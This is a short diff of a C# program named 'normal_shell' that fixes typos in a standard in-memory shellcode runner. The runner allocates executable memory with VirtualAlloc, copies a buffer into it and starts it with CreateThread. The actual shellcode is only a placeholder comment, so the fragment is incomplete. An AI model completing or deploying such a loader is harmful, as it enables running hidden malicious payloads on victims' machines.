@@ -3,7 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using Systen.Runtime.Interopservice;
+using System.Runtime.InteropServices;
 
 namespace normal_shell
 {
@@ -20,11 +20,15 @@ namespace normal_shell
     
         static void Main(string[] args)
         {
-          IntPtr addr = VirtualAlloc(IntPtr.zero, 0x1000, 0x3000, 0x40);
-          # shell code
+          IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+          //shellcode
+          
+          
           
           Marshal.Copy(buf, 0, addr, size);
-          WaitForSingleObject(hThread, 0xFFFFFFFFF);
+          //create thread
+          IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+          WaitForSingleObject(hThread, 0xFFFFFFFF);
         }
     }
 }
